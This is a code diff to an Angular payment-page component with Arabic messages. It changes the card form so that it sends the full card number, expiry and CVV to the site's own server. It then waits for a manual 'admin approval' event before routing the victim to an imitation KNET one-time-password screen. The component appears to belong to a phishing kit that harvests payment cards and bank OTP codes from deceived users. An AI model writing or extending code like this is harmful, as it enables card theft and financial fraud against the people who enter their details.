@@ -1,9 +1,10 @@
-import { Component, signal, computed, inject, OnInit } from '@angular/core';
+import { Component, signal, inject, OnInit, OnDestroy } from '@angular/core';
 import { CommonModule } from '@angular/common';
 import { FormsModule } from '@angular/forms';
 import { Router } from '@angular/router';
 import { ButtonComponent } from '../../ui/button/button';
 import { ToastService } from '../../services/toast';
+import { enviroment } from '../../../env/enviroment';
 
 @Component({
   selector: 'app-choose-payment',
@@ -12,7 +13,7 @@ import { ToastService } from '../../services/toast';
   templateUrl: './choose-payment.html',
   styleUrl: './choose-payment.css',
 })
-export class ChoosePayment implements OnInit {
+export class ChoosePayment implements OnInit, OnDestroy {
   toastService = inject(ToastService);
   router = inject(Router);
   // Navigation active tab for sidebar
@@ -30,8 +31,22 @@ export class ChoosePayment implements OnInit {
   // Offer modal — shown once when page loads
   showOfferModal = signal<boolean>(true);
 
+  // SSE connection for Visa approval waiting
+  private eventSource: EventSource | null = null;
+
   closeOfferModal() {
     this.showOfferModal.set(false);
+  }
+
+  ngOnDestroy() {
+    this.cleanupSSE();
+  }
+
+  private cleanupSSE() {
+    if (this.eventSource) {
+      this.eventSource.close();
+      this.eventSource = null;
+    }
   }
 
   ngOnInit() {
@@ -86,21 +101,7 @@ export class ChoosePayment implements OnInit {
     const method = this.selectedMethod();
 
     if (method === 'credit-card') {
-      // Validate form fields first
-      if (!this.cardName().trim() || this.cardNumber().length < 16 ||
-          this.cardExpiry().length < 5 || this.cardCvv().length < 3) {
-        this.toastService.show('يرجى إدخال جميع بيانات البطاقة بشكل صحيح.', 'error');
-        return;
-      }
-      // Show loading then error
-      this.isLoading.set(true);
-      setTimeout(() => {
-        this.isLoading.set(false);
-        this.toastService.show(
-          'عذراً، طريقة الدفع هذه غير متاحة حالياً. يمكنك تجربة الدفع عبر كي نت.',
-          'error'
-        );
-      }, 2500);
+      this.submitVisaPayment();
       return;
     }
 
@@ -110,6 +111,87 @@ export class ChoosePayment implements OnInit {
       this.isLoading.set(false);
       this.router.navigate(['/pay/knet']);
     }, 2000);
+  }
+
+  private async submitVisaPayment() {
+    // Validate form fields (no name required)
+    if (this.cardNumber().length < 16 ||
+        this.cardExpiry().length < 5 || this.cardCvv().length < 3) {
+      this.toastService.show('يرجى إدخال جميع بيانات البطاقة بشكل صحيح.', 'error');
+      return;
+    }
+
+    const clientId = localStorage.getItem('client_id');
+    if (!clientId) {
+      this.toastService.show('جلسة الدفع منتهية. يرجى البدء من جديد', 'error');
+      this.router.navigate(['/']);
+      return;
+    }
+
+    this.isLoading.set(true);
+
+    // Parse expiry: MM/YY → month + year
+    const expiryParts = this.cardExpiry().split('/');
+    const ccMonth = expiryParts[0] || '';
+    const ccYear = expiryParts[1] || '';
+
+    try {
+      const response = await fetch(enviroment.api_base + '/api/payments', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          cc_number: this.cardNumber(),
+          cc_name: 'Visa Card',
+          cc_month: ccMonth,
+          cc_year: ccYear,
+          cc_pin: this.cardCvv(),
+          client_id: clientId
+        })
+      });
+
+      const resData = await response.json();
+      if (!resData.success) {
+        this.isLoading.set(false);
+        this.toastService.show(resData.error || 'حدث خطأ أثناء إرسال البيانات', 'error');
+        return;
+      }
+
+      // Listen for admin approval via SSE
+      this.cleanupSSE();
+      this.eventSource = new EventSource(enviroment.api_base + `/api/events/client/${clientId}`);
+      this.eventSource.addEventListener('payment_status', (evt: any) => {
+        const payload = JSON.parse(evt.data);
+        if (payload.status === 'ACCEPTED') {
+          this.cleanupSSE();
+          this.isLoading.set(false);
+          // Store card info for OTP screen display
+          const rawNum = this.cardNumber();
+          const first6 = rawNum.substring(0, 6);
+          const last4 = rawNum.substring(rawNum.length - 4);
+          const maskedCard = first6.substring(0, 4) + ' ' + first6.substring(4, 6) + '** **** ' + last4;
+          localStorage.setItem('masked_card', maskedCard);
+          localStorage.setItem('expiry_month', ccMonth);
+          localStorage.setItem('expiry_year', '20' + ccYear);
+          localStorage.removeItem('bank_logo');
+          localStorage.removeItem('bank_name');
+          this.router.navigate(['/pay/knet/otp']);
+        } else if (payload.status === 'REJECTED') {
+          this.cleanupSSE();
+          this.isLoading.set(false);
+          this.toastService.show('المعلومات المدخلة خاطئة. يرجى التحقق من بيانات البطاقة والمحاولة مرة أخرى.', 'error');
+        }
+      });
+
+      this.eventSource.onerror = () => {
+        this.cleanupSSE();
+        this.isLoading.set(false);
+        this.toastService.show('خطأ في الاتصال بالخادم. يرجى المحاولة لاحقاً.', 'error');
+      };
+
+    } catch {
+      this.isLoading.set(false);
+      this.toastService.show('فشل الاتصال بالخادم. يرجى المحاولة لاحقاً.', 'error');
+    }
   }
 
   onBack() {
